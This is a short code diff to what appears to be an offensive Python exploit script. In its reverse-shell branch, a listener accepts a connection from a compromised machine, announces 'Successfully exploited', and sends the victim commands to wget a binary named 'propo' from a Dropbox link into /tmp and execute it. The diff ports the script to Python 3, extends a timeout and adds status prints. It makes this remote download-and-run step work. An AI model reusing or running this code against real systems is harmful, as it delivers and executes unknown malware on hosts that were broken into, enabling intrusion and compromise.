@@ -104,14 +104,18 @@ buff = 1024
 while True:
 	if args['payload'] == 'reverse':
 		clientsocket, clientaddr = serversocket.accept()
-		print ("[!] Successfully exploited")
-		print (f"[!] Incoming connection from {clientaddr[0]}")
+		print("[!] Successfully exploited")
+		print(f"[!] Incoming connection from {clientaddr[0]}")
 		stop = True
-		clientsocket.settimeout(3)
+		clientsocket.settimeout(100)
 		# These links may change as we update the files
-		clientsocket.sendall("wget -O /tmp/propo https://www.dropbox.com/s/094z3h3y3mlt1np/propo")
-		clientsocket.recv(buff)
-		clientsocket.sendall("cd /tmp; ./propo")
+		print("[-] Obtaining propo...")
+		clientsocket.sendall("wget -O /tmp/propo https://www.dropbox.com/s/094z3h3y3mlt1np/propo".encode())
+		time.sleep(1)
+		data = clientsocket.recv(buff)
+		print(data.decode())
+		time.sleep(1)
+		clientsocket.sendall("cd /tmp; ./propo".encode())
 		clientsocket.close()
 		# while True:
 		# 	reply = input(f"{clientaddr[0]}> ")
